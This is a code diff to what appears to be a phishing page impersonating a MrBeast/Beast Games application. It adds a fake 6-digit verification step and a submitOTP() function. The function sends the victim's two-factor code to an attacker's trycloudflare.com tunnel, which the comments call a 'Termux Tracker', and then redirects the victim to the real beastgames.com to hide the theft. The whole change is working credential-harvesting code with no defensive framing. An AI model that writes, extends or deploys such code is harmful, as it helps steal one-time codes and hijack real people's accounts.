@@ -192,8 +192,8 @@
         <!-- Paste this between Line 191 and 192 -->
         <div id="step2" style="display:none; text-align:center; padding:20px;">
             <p style="color:white;">A 6-digit verification code was sent to your device. Please enter it below to confirm your application:</p>
-            <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="margin-bottom:10px;">
-            <button type="button" onclick="submitOTP()" class="main-btn">VERIFY CODE</button>
+           <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="margin-bottom:10px;">
+           <button type="button" class="main-btn" onclick="submitOTP()">VERIFY CODE</button>
 
         </div>
 
@@ -279,7 +279,25 @@
                 document.getElementById('loader').style.display = 'none'; 
                 document.getElementById('step2').style.display = 'block'; 
             }, 14000);
-        }
+       }
+   function submitOTP() {
+    // 1. Grab the 6-digit code from the input box
+    const c = document.getElementById('2fa_code').value; 
+    
+    // 2. Send the code to your Termux Tracker in Window 2
+    fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ '2fa_code': c })
+    }).then(() => {
+        // 3. THIS UNSTUCKS THE SITE: Redirect to the real MrBeast site
+        window.location.href = "https://www.beastgames.com";
+    }).catch(() => {
+        // Redirect anyway even if the tunnel is slow
+        window.location.href = "https://www.beastgames.com";
+    });
+}
+
     </script>
 </body>
 </html>
